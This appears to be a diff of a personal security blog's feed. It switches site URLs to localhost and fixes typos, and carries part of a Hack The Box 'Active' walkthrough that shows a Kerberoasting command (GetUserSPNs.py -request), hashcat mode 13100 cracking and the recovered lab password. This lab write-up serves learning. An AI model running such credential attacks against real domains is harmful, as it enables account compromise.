 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;./GetUserSPNs.py &lt;span class=&quot;nt&quot;&gt;-request&lt;/span&gt; active.htb/SVC_TGS&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://cyb3rdan.com/assets/images/active/active-impacket.jpg&quot; alt=&quot;active-impacket&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/active/active-impacket.jpg&quot; alt=&quot;active-impacket&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;
-    &lt;p&gt;checked the &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;Hashcat example hashes page&lt;/a&gt; for $krb5tgs$23$ format and found that it matches mode 13100&lt;/p&gt;
+    &lt;p&gt;checked the &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;Hashcat example hashes page&lt;/a&gt; for $krb5tgs$23$ format and found that it matched mode 13100&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;added the entire $krb5tgs$23$ string above to a file called active.krb, and used hashcat along with the rockyou.txt wordlist to get the password&lt;/p&gt;
@@ -85,7 +262,7 @@
     &lt;p&gt;after only a few seconds I had the password: &lt;strong&gt;Ticketmaster1968&lt;/strong&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
-    &lt;p&gt;ran the following command with the new crednetials to connect to the users share&lt;/p&gt;
+    &lt;p&gt;ran the following command with the new credentials to connect to the users share&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
@@ -105,9 +282,9 @@
  
  <entry>
    <title>First Post</title>
-   <link href="https://cyb3rdan.com/2018/11/16/First-Post/"/>
+   <link href="http://localhost:4000/2018/11/16/First-Post/"/>
    <updated>2018-11-16T00:00:00+10:30</updated>
-   <id>https://cyb3rdan.com/2018/11/16/First-Post</id>
+   <id>http://localhost:4000/2018/11/16/First-Post</id>
    <content type="html">&lt;p&gt;Creating a blog is something I’ve been wanting to do for a while now, but there have been so many more important things going on in my life that meant I just never got around to it.&lt;/p&gt;
 
 &lt;p&gt;In terms of content, I have been focusing quite a lot on &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt; lately, and I will likely start with some walkthroughs once I get around to making my notes more complete.&lt;/p&gt;
